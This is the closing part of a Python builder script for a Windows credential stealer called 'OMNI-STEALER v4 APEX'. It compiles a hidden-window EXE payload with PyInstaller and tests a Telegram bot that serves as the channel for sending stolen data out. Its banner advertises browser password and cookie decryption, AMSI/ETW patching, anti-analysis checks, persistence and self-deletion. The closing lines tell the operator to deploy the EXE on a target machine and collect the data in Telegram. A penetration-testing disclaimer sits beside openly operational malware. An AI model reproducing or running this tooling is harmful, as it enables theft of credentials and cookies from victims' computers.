        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--hidden-import", "win32crypt",
        "--hidden-import", "win32com",
        "--hidden-import", "win32process",
        "--hidden-import", "win32api",
        "--hidden-import", "win32security",
        "--hidden-import", "pythoncom",
        "--hidden-import", "cryptography",
        "--hidden-import", "cryptography.hazmat.primitives.ciphers.aead",
        "--hidden-import", "comtypes",
        "--hidden-import", "pywintypes",
        "--distpath", os.path.dirname(output_path),
        "--specpath", build_dir,
        "--workpath", os.path.join(build_dir, "build"),
        "--add-data", f"{os.path.dirname(os.__file__)}/site-packages/win32;win32",
        "--name", os.path.splitext(OUTPUT_EXE_NAME)[0],
        "--version-info", "",  # No version info to keep size down
        payload_path,
    ]

    try:
        result = subprocess.run(cmd, check=True, cwd=build_dir, capture_output=True, text=True)
        print(f"[*] PyInstaller output:\n{result.stdout[-500:]}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Build failed with code {e.returncode}")
        print(f"[!] STDERR:\n{e.stderr[-1000:]}")
        print(f"[!] STDOUT:\n{e.stdout[-1000:]}")
        # Fallback: try without hidden imports
        print("\n[*] Retrying with minimal flags...")
        try:
            cmd_minimal = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--distpath", os.path.dirname(output_path),
                "--specpath", build_dir,
                "--workpath", os.path.join(build_dir, "build"),
                "--name", os.path.splitext(OUTPUT_EXE_NAME)[0],
                payload_path,
            ]
            subprocess.run(cmd_minimal, check=True, cwd=build_dir)
        except subprocess.CalledProcessError as e2:
            print(f"[-] Fallback also failed: {e2}")
            # Try to find any built exe
            for root, dirs, files in os.walk(build_dir):
                for f in files:
                    if f.endswith(".exe"):
                        found = os.path.join(root, f)
                        shutil.copy2(found, output_path)
                        print(f"[+] Found and copied: {found}")
                        break
            return

    # Find and copy the EXE
    found = False
    for root, dirs, files in os.walk(build_dir):
        for f in files:
            if f.endswith(".exe") and "OmniStealer" not in f:
                continue
            if f == OUTPUT_EXE_NAME or f == os.path.splitext(OUTPUT_EXE_NAME)[0] + ".exe":
                src = os.path.join(root, f)
                shutil.copy2(src, output_path)
                print(f"\n[+] SUCCESS! EXE: {output_path}")
                print(f"[+] Size: {os.path.getsize(output_path) / 1024:.2f} KB")
                found = True
                break
        if found:
            break

    if not found:
        # Check standard PyInstaller output locations
        for candidate in [
            os.path.join(os.getcwd(), "dist", OUTPUT_EXE_NAME),
            os.path.join(os.getcwd(), OUTPUT_EXE_NAME),
            os.path.join(build_dir, "dist", OUTPUT_EXE_NAME),
        ]:
            if os.path.exists(candidate):
                shutil.copy2(candidate, output_path)
                print(f"\n[+] SUCCESS! EXE: {output_path}")
                print(f"[+] Size: {os.path.getsize(output_path) / 1024:.2f} KB")
                found = True
                break

    if not found:
        print("[-] Could not find output EXE. Check PyInstaller output above.")

    # Cleanup
    try:
        shutil.rmtree(build_dir, ignore_errors=True)
    except:
        pass


def test_telegram():
    """Test Telegram bot connection."""
    token = TELEGRAM_BOT_TOKEN or os.environ.get("TELEGRAM_BOT_TOKEN", "")
    chat_id = TELEGRAM_CHAT_ID or os.environ.get("TELEGRAM_CHAT_ID", "")

    if not token or not chat_id:
        print("[-] Telegram not configured.")
        return False

    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        resp = urllib.request.urlopen(url, timeout=10)
        data = json.loads(resp.read().decode())
        if data.get("ok"):
            bot_name = data["result"]["first_name"]
            print(f"[+] Bot connected: @{bot_name}")

            # Test message
            test_url = f"https://api.telegram.org/bot{token}/sendMessage"
            test_data = json.dumps({
                "chat_id": chat_id,
                "text": "🧪 <b>OMNI-STEALER v4 APEX</b>\nTest OK!",
                "parse_mode": "HTML",
            }).encode()
            req = urllib.request.Request(test_url, data=test_data, headers={"Content-Type": "application/json"})
            resp = urllib.request.urlopen(req, timeout=10)
            result = json.loads(resp.read().decode())
            if result.get("ok"):
                print("[+] Telegram test message sent!")
                return True
            else:
                print(f"[-] Send failed: {result.get('description', '?')}")
                return False
        else:
            print(f"[-] Bot error: {data.get('description', '?')}")
            return False
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Banner
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║         OMNI-STEALER v4 — APEX EDITION              ║
    ║    Advanced Browser Credential Extraction Framework ║
    ║        For Authorized Penetration Testing Only      ║
    ╚══════════════════════════════════════════════════════╝

    [FEATURES]
    ├─ DPAPI Master Key Decryption (v10)
    ├─ AES-GCM Cookie Decryption (v11)
    ├─ CDP WebSocket Remote Debugging Bypass (v20 ABE)
    ├─ COM IElevator DecryptData via Elevation Service
    ├─ Registry Policy Disable (admin)
    ├─ AMSI/ETW Patching
    ├─ Anti-Sandbox / Anti-Debug / Anti-VM
    ├─ Multi-Channel Exfil (Telegram, HTTP, DNS)
    ├─ Persistence (Task, Registry, Startup)
    └─ Full Forensic Cleanup + Self-Deletion
    """)

    # Parse CLI args
    if len(sys.argv) > 1:
        TELEGRAM_BOT_TOKEN = sys.argv[1]
    if len(sys.argv) > 2:
        TELEGRAM_CHAT_ID = sys.argv[2]
    if len(sys.argv) > 3:
        C2_SERVER_URL = sys.argv[3]

    # Step 1: Telegram test
    print("[*] STEP 1: Testing Telegram connection...")
    test_telegram()

    # Step 2: Build
    print("\n[*] STEP 2: Building EXE payload...")
    build_payload()

    # Step 3: Done
    print(f"\n[*] STEP 3: Complete!")
    print(f"[*] Executable: {OUTPUT_EXE_NAME}")
    print(f"[*] Deploy to target Windows machine and execute.")
    print(f"[*] All data will arrive in your Telegram.")
